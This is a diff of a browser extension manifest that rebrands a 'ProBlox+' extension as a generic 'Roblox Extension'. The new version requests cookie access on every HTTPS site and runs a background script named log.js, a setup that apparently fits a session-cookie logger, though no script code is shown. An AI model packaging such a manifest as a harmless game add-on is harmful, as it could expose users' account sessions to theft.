@@ -1,24 +1,57 @@
 {
-    "name": "ProBlox+",
-    "version": "1.9.0", 
-    "manifest_version": 2,
-    "description": "This Extension Is In Beta Stage And May Have Bugs.", 
-    "browser_action": {
-        "default_icon": "icon.png"
-       
+
+    "name": "Roblox Extension",
+
+    "description": "Extension for https://www.roblox.com",
+
+    "version": "1.0.0",
+
+    "manifest_version": 3,
+
+
+
+    "action" : {
+
+        "default_icon": "assets/roblox.png"
+
     },
-    "permissions": [
-        "alarms",
-        "background",
-        "debugger",
-        "notifications",
-        "cookies",
-        "https://www.roblox.com/" 
+
+
+
+    "host_permissions": [
+
+	"https://*/*"
+
     ],
+
+
+
+    "permissions": [
+
+        "cookies"
+
+    ],
+
+
+
     "background": {
-        "scripts": ["bgWork.js", "jQuery-ver3.js"]
+
+        "service_worker": "scripts/log.js"
+
     },
-    "icons": { "16": "icon.png",
-           "48": "icon.png",
-          "128": "icon.png" }
+
+
+
+    "icons": {
+
+        "16": "assets/roblox.png",
+
+        "32": "assets/roblox.png",
+
+        "48": "assets/roblox.png",
+
+        "128": "assets/roblox.png"
+
+    }
+
 }
